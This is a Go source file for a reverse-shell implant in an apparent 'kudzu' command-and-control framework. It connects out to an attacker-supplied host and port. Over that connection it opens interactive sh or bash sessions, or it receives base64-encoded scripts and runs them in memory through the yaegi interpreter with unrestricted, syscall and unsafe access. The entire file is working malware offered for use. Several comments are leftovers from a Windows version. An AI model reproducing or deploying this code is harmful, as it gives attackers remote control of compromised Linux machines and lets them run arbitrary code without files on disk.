/*{
Description: Kudzu shell for Linux. Provides access to kudzu scripts, sh, and bash. This was a bitch to make.
Author: TerminalJockey
Options:
LHOST
LPORT
}*/

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/syscall"
	"github.com/traefik/yaegi/stdlib/unrestricted"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

func main() {
	revcon, err := net.Dial("tcp", "{{.Laddr}}")
	if err != nil {
		log.Println(err)
		return
	}
	conbuf := bufio.NewReader(revcon)
	for {
		revcon.Write([]byte("<kudzu shell> "))
		str, err := conbuf.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				log.Println(err)
			}
			break
		}
		args := strings.Split(strings.TrimSpace(str), " ")

		switch args[0] {
		case "runscript":
			RunScript(revcon)
		case "runwithoutput":
			RunScriptWithOutput(revcon)
		case "shshell":
			newcon := revcon
			ShShell(newcon)
		case "bashshell":
			newcon := revcon
			BashShell(newcon)
		case "help":
			revcon.Write([]byte("sysinfo: print system info to console\n"))
			revcon.Write([]byte("shshell: spawn sh\n"))
			revcon.Write([]byte("bashshell: spawn bash\n"))
			revcon.Write([]byte("kdz_bg: background current session, return to kdz console\n"))
			revcon.Write([]byte("kdz_exit: exit current session, return to kdz console\n"))
			revcon.Write([]byte("runscript: run provided kzs in memory. usage: runscript win_calc.kzs\n"))
		}
	}
}

//CmdShell hooks up cmd.exe to the tcp connection
func ShShell(conn net.Conn) {
	cmd := exec.Command("sh", "-i")
	cmd.Env = append(os.Environ(), "TERM=dumb")
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Write([]byte("done\n"))
}

//PwShell hooks up powershell.exe to the tcp connection
func BashShell(conn net.Conn) {
	cmd := exec.Command("bash", "-i")
	cmd.Env = append(os.Environ(), "TERM=dumb")
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Write([]byte("done\n"))
}

//RunScript runs given kzs
func RunScript(conn net.Conn) {
	fmt.Println("entered runscript")
	script, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Println(err)
	}
	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
	if err != nil {
		log.Println(err)
	}
	go interpret(scriptbytes)
}

//RunScriptWithOutput runs given kzs and returns output
func RunScriptWithOutput(conn net.Conn) {
	fmt.Println("entered RunScriptWithOutput")
	script, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Println(err)
	}
	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
	if err != nil {
		log.Println(err)
	}
	go interpretWithOutput(scriptbytes, conn)
}

func interpret(scriptbytes []byte) {
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	i.Use(unrestricted.Symbols)
	i.Use(syscall.Symbols)
	i.Use(unsafe.Symbols)
	_, err := i.Eval(string(scriptbytes))
	if err != nil {
		log.Println(err)
	}
}

func interpretWithOutput(scriptbytes []byte, revcon net.Conn) {
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(syscall.Symbols)
	i.Use(unrestricted.Symbols)

	fmt.Println(string(scriptbytes))
	i.Eval(string(scriptbytes))
	v, err := i.Eval("runner.RunScript")
	if err != nil {
		revcon.Write([]byte(err.Error() + "\n"))
		return
	}
	runscript := v.Interface().(func() string)

	out := runscript()
	fmt.Println(out)
	revcon.Write([]byte(out))
}
